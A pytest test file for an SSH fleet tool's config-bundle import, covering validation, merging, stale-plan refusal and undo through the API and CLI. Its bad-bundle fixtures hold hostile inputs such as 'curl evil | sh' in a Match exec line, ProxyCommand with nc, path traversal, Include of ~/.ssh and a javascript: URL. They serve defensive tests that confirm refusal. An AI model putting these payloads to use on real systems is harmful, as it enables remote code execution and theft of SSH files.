"""Import: checked whole before anything is written, merged without losing what is here, undoable."""

from __future__ import annotations

import asyncio
import copy
import json
from pathlib import Path

import pytest
from typer.testing import CliRunner

from sshfleet.bundle import REDACTED, BundleError, StalePlan, apply_import, build, parse, plan_import, to_json
from sshfleet.config import Config, TunnelCfg
from sshfleet.config import loader as config_loader
from sshfleet.paths import Paths


def exported(context, **options) -> dict:
    return build(context.config, context.inventory, context.paths, **options)[0]


def plan(context, bundle, **options):
    return plan_import(bundle, config=context.config, paths=context.paths, **options)


def snapshot(*paths: Path) -> dict[str, bytes | None]:
    out = {}
    for root in paths:
        files = [root] if root.is_file() else sorted(p for p in root.rglob("*") if p.is_file()) if root.exists() else []
        for f in files:
            out[str(f)] = f.read_bytes()
    return out


def test_importing_your_own_export_changes_nothing(context):
    result = plan(context, exported(context))
    assert result.changed is False
    assert {c.action for c in result.changes} <= {"same"}


def test_a_second_import_into_a_fresh_home_is_a_no_op(context, tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    """A teammate's first import brings everything; importing the same bundle again changes nothing."""
    bundle = exported(context)
    monkeypatch.setenv("SSHFLEET_SSH_DIR", str(tmp_path / "their-ssh"))
    theirs = Paths.detect(tmp_path / "their-home").ensure()

    first = plan_import(bundle, config=Config(), paths=theirs)
    assert first.changed and first.needs_key == ["lab/testing"]
    env_file = tmp_path / "their-ssh" / "config.d" / "lab_test"
    assert list(first.files_after) == [str(env_file)]
    apply_import(first, theirs)
    assert env_file.read_text() == bundle["ssh"]["test-env"]
    assert env_file.stat().st_mode & 0o777 == 0o600

    loaded = config_loader.load(theirs.config_file)
    assert [e.name for e in loaded.environments] == ["testing"] and loaded.environments[0].key_path is None
    assert loaded.hosts["tst-order"].label == "order"
    assert plan_import(bundle, config=loaded, paths=theirs).changed is False


def _with_file(bundle: dict, name: str, text: str = "Host x\n    HostName 10.0.0.1\n") -> dict:
    bundle["ssh"][name] = text
    bundle["fleet"]["environments"][0]["ssh_file"] = name
    return bundle


BAD_BUNDLES = {
    "escape": lambda b: _with_file(b, "../escape"),
    "hidden": lambda b: _with_file(b, ".hidden"),
    "subdir": lambda b: _with_file(b, "sub/dir"),
    "wrong-kind": lambda b: {**b, "kind": "something-else"},
    "cloud-push": lambda b: {**b, "kind": "sshfleet-cloud-bundle"},
    "wrong-version": lambda b: {**b, "version": 1},
    "newer-config": lambda b: {**b, "manifest": {**b["manifest"], "config_version": 99}},
    "missing-file": lambda b: {**b, "ssh": {}},
    "oversized": lambda b: _with_file(b, "big", "#" * (1024 * 1024 + 1)),
    "proxycommand": lambda b: _with_file(b, "test-env", "Host x\n    ProxyCommand nc %h %p\n"),
    "match-exec": lambda b: _with_file(b, "test-env", 'Match host * exec "curl evil | sh"\n    User x\n'),
    "include": lambda b: _with_file(b, "test-env", "Include ~/.ssh/*\n"),
    "key-material": lambda b: _with_file(b, "test-env", "-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n"),
    "nameless-env": lambda b: {**b, "fleet": {**b["fleet"], "environments": [{"ssh_file": "test-env"}]}},
}


@pytest.mark.parametrize("damage", list(BAD_BUNDLES))
def test_a_bad_bundle_is_refused_before_anything_is_written(context, sample_env_file, damage: str):
    bundle = BAD_BUNDLES[damage](copy.deepcopy(exported(context)))
    before = snapshot(context.paths.config_file, sample_env_file, context.paths.config_dir)
    with pytest.raises(BundleError):
        plan(context, parse(to_json(bundle)))
    assert snapshot(context.paths.config_file, sample_env_file, context.paths.config_dir) == before


def test_commands_come_in_only_when_allowed(context):
    bundle = _with_file(copy.deepcopy(exported(context)), "test-env", exported(context)["ssh"]["test-env"] + "\nHost tst-px\n    ProxyCommand nc %h %p\n")
    with pytest.raises(BundleError, match="would run on this machine"):
        plan(context, bundle)
    allowed = plan(context, bundle, allow_commands=True)
    assert any("run a program" in w for w in allowed.warnings)


def test_a_stale_plan_is_refused(context, sample_env_file):
    bundle = copy.deepcopy(exported(context))
    bundle["ssh"]["test-env"] += "\nHost tst-new\n    HostName 10.99.0.99\n"
    result = plan(context, bundle)
    sample_env_file.write_text(sample_env_file.read_text() + "\n# edited in the meantime\n")
    config_before = context.paths.config_file.read_bytes()
    with pytest.raises(StalePlan):
        apply_import(result, context.paths)
    assert context.paths.config_file.read_bytes() == config_before


def test_local_changes_are_kept_unless_the_bundle_is_preferred(context):
    bundle = copy.deepcopy(exported(context))
    bundle["fleet"]["thresholds"]["disk_warn_pct"] = 70
    bundle["fleet"]["hosts"]["tst-order"]["label"] = "orders"
    context.config.thresholds.disk_warn_pct = 75  # chosen here
    kept = plan(context, bundle)
    actions = {(c.kind, c.name): c.action for c in kept.changes}
    assert actions[("setting", "thresholds")] == "kept-local"
    assert actions[("host", "tst-order")] == "kept-local"
    taken = plan(context, bundle, prefer="bundle")
    assert taken.config_after["thresholds"]["disk_warn_pct"] == 70
    assert taken.config_after["hosts"]["tst-order"]["label"] == "orders"


def test_a_default_nobody_chose_gives_way_to_the_bundle(context):
    bundle = copy.deepcopy(exported(context))
    bundle["fleet"]["thresholds"]["mem_warn_pct"] = 70
    assert context.config.thresholds.mem_warn_pct == Config().thresholds.mem_warn_pct
    assert plan(context, bundle).config_after["thresholds"]["mem_warn_pct"] == 70


def test_a_redacted_value_never_replaces_a_real_one(context):
    context.config.logs.elastic = {"url": "https://es.example", "password": "the-real-one"}
    bundle = exported(context)
    assert bundle["fleet"]["logs"]["elastic"]["password"] == REDACTED
    result = plan(context, bundle, prefer="bundle")
    assert result.config_after["logs"]["elastic"]["password"] == "the-real-one"
    context.config.logs.elastic = {}
    assert "logs.elastic.password" in plan(context, bundle, prefer="bundle").needs_value


def test_a_local_key_and_pause_survive_an_import(context):
    context.config.hosts["tst-order"].paused = True
    key_path = context.config.environments[0].key_path
    bundle = copy.deepcopy(exported(context))
    bundle["fleet"]["hosts"]["tst-order"]["label"] = "changed"
    bundle["fleet"]["environments"][0]["color"] = "red"
    result = plan(context, bundle, prefer="bundle")
    env = result.config_after["environments"][0]
    assert env["key_path"] == str(key_path) and env["color"] == "red"
    assert result.config_after["hosts"]["tst-order"]["paused"] is True


def test_an_environment_here_without_a_key_takes_the_bundles_key_path(context):
    key_path = context.config.environments[0].key_path
    bundle = exported(context, with_local=True)
    context.config.environments[0].key_path = None
    result = plan(context, bundle, with_local=True)
    assert result.config_after["environments"][0]["key_path"] == str(key_path)
    assert any(c.kind == "environment" and c.note == "its key path from the bundle" for c in result.changes)


def test_a_tunnel_on_a_port_already_used_here_is_skipped(context):
    context.config.tunnels["mine"] = TunnelCfg(name="mine", env="testing", via="tst-order", remote="127.0.0.1:5432", local=15432)
    bundle = copy.deepcopy(exported(context))
    del bundle["fleet"]["tunnels"]["mine"]
    bundle["fleet"]["tunnels"]["theirs"] = {"env": "testing", "via": "tst-auth", "remote": "127.0.0.1:5432", "local": 15432, "open": "javascript:alert(1)"}
    result = plan(context, bundle)
    tunnel = next(c for c in result.changes if c.kind == "tunnel" and c.name == "theirs")
    assert tunnel.action == "conflict" and "15432" in tunnel.note
    assert "theirs" not in result.config_after["tunnels"]


def test_an_environment_whose_name_another_project_has_here_comes_in_beside_it(context, tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    """Matched by project and name, not id: the id is each machine's own, and tunnels follow it."""
    from sshfleet.config import EnvironmentCfg, ProjectCfg

    context.config.tunnels["kibana"] = TunnelCfg(name="kibana", env="testing", via="tst-order", remote="127.0.0.1:5601", local=15601)
    bundle = exported(context)
    monkeypatch.setenv("SSHFLEET_SSH_DIR", str(tmp_path / "their-ssh"))
    theirs = Paths.detect(tmp_path / "their-home").ensure()
    mine = tmp_path / "mine-env"
    mine.write_text("Host mine-one\n    HostName 10.0.0.9\n")
    here = Config(
        projects=[ProjectCfg(name="other")],
        environments=[EnvironmentCfg(name="testing", ssh_config_path=mine, short="test", project="other")],
    )

    result = plan_import(bundle, config=here, paths=theirs)
    envs = [(e["project"], e["name"], e.get("id")) for e in result.config_after["environments"]]
    assert envs == [("other", "testing", None), ("lab", "testing", "lab-testing")]
    assert result.config_after["tunnels"]["kibana"]["env"] == "lab-testing"
    assert {(c.kind, c.name, c.action) for c in result.changes} >= {("environment", "lab/testing", "add"), ("project", "lab", "add")}

    # Imported again once applied, it is the same environment, not a third one.
    apply_import(result, theirs)
    again = plan_import(bundle, config=config_loader.load(theirs.config_file), paths=theirs)
    assert again.changed is False


def test_replace_mode_unregisters_what_the_bundle_does_not_carry_but_deletes_no_file(context, tmp_path: Path):
    from sshfleet.config import EnvironmentCfg

    other = tmp_path / "other-env"
    other.write_text("Host oth\n    HostName 10.0.0.5\n")
    bundle = exported(context)
    context.config.environments.append(EnvironmentCfg(name="other", ssh_config_path=other, short="oth", project="lab"))
    result = plan(context, bundle, mode="replace")
    assert [e["name"] for e in result.config_after["environments"]] == ["testing"]
    assert any(c.name == "lab/other" and c.action == "remove" for c in result.changes)
    apply_import(result, context.paths)
    assert other.exists()


@pytest.fixture
def quiet(web, monkeypatch):
    _, state = web
    monkeypatch.setattr(state, "wake", lambda: None)
    monkeypatch.setattr(state, "refresh", lambda **_: asyncio.sleep(0))
    return web


async def test_an_import_through_the_page_is_undone_from_history(quiet, configured, sample_env_file):
    client, state = quiet
    bundle = (await client.get("/api/settings/export")).json()
    bundle["ssh"]["test-env"] += "\nHost tst-imported\n    HostName 10.99.0.50\n    ProxyJump tst-bastion\n"
    bundle["fleet"]["hosts"]["tst-imported"] = {"label": "imported", "role": "service"}
    original = (configured.read_bytes(), sample_env_file.read_bytes())

    dry = await client.post("/api/settings/import", content=json.dumps(bundle))
    assert dry.status_code == 200, dry.text
    planned = dry.json()["plan"]
    assert planned["changed"] and any(c["name"] == "tst-imported" and c["action"] == "add" for c in planned["changes"])
    assert configured.read_bytes() == original[0]  # a dry run writes nothing

    applied = await client.post("/api/settings/import", params={"dry_run": "false", "digest": planned["digest"]}, content=json.dumps(bundle))
    assert applied.status_code == 200, applied.text
    body = applied.json()
    assert "tst-imported" in state.context.inventory.by_alias
    assert state.history.get(body["after"]).source == "import"
    assert state.context.audit.tail(1)[0]["action"] == "config.import"

    code = state.history.get(body["before"]).code
    undone = await client.post(f"/api/settings/history/{body['before']}/restore", json={"confirm": code})
    assert undone.status_code == 200, undone.text
    assert (configured.read_bytes(), sample_env_file.read_bytes()) == original


async def test_the_page_applies_only_the_plan_that_was_looked_at(quiet):
    client, _ = quiet
    bundle = (await client.get("/api/settings/export")).json()
    bundle["fleet"]["hosts"]["tst-order"]["label"] = "orders"
    planned = (await client.post("/api/settings/import", params={"prefer": "bundle"}, content=json.dumps(bundle))).json()["plan"]
    await client.patch("/api/settings/hosts/tst-auth", json={"display": "changed meanwhile"})
    stale = await client.post(
        "/api/settings/import", params={"dry_run": "false", "prefer": "bundle", "digest": planned["digest"]}, content=json.dumps(bundle)
    )
    assert stale.status_code == 409
    assert (await client.post("/api/settings/import", params={"dry_run": "false"}, content=json.dumps(bundle))).status_code == 400
    too_big = await client.post("/api/settings/import", content=b"{" + b" " * (5 * 1024 * 1024 + 10))
    assert too_big.status_code == 413


def test_the_cli_diff_exit_codes_suit_a_pre_commit_check(configured, fake_ssh, tmp_path: Path):
    from sshfleet.cli.main import app

    runner = CliRunner()
    folder = tmp_path / "shared"
    assert runner.invoke(app, ["config", "export", "--out", str(folder)]).exit_code == 0
    assert runner.invoke(app, ["config", "diff", str(folder)]).exit_code == 0
    (folder / "ssh" / "test-env").write_text((folder / "ssh" / "test-env").read_text() + "\nHost tst-team\n    HostName 10.99.0.60\n")
    assert runner.invoke(app, ["config", "diff", str(folder)]).exit_code == 1
    imported = runner.invoke(app, ["config", "import", str(folder), "--yes"])
    assert imported.exit_code == 0, imported.output
    assert runner.invoke(app, ["config", "diff", str(folder)]).exit_code == 0
    (folder / "ssh" / "test-env").write_text("Include ~/.ssh/*\n")
    assert runner.invoke(app, ["config", "diff", str(folder)]).exit_code == 2
